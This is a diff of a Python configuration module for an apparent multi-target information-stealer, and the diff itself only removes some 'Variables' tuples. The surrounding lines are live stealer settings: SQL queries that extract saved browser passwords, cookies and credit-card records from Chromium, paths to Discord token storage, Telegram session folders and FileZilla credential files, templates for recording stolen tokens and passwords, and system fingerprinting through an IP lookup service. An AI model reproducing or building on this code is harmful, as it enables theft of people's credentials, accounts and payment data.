@@ -13,7 +13,6 @@ class ChromiumConfig:
 
     BookmarksRegex = compile(r'.*"name":[\s]+"(.*)".*"type".*"url":[\s]+"([^\s]+)"', IGNORECASE + DOTALL)
 
-    Variables = ("browser_name", "storage_path", "state_path", "browser_path", "statuses", "errors")
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL = "SELECT * FROM cookies"
     CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
@@ -67,7 +66,6 @@ class MultistealerConfig:
 class SystemConfig:
 
     User = user
-    Variables = ("storage_path", "folder", "statuses", "errors")
     IPUrl = "https://api.ipify.org/"
     SystemData = "User: {0}\nIP: {1}\nOS Name: {2}\nOS Version: {3} {4}\nMonitors: {5}\nCPU: {6}\nGPU: {7}\nRAM: {8} GB\n"
 
@@ -89,7 +87,6 @@ class AutostartConfig:
 class DiscordConfig:
 
     TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
-    Variables = ("storage_path", "folder", "statuses", "errors")
     UserAgent = user_agent
     DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"
 
@@ -97,12 +94,10 @@ class DiscordConfig:
 class TelegramConfig:
 
     SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop\tdata"
-    Variables = ("storage_path", "folder", "statuses", "errors")
 
 
 class FileZillaConfig:
 
     SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
-    Variables = ("storage_path", "folder", "statuses", "errors")
     DataFiles = ("recentservers.xml", "sitemanager.xml")
     FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"
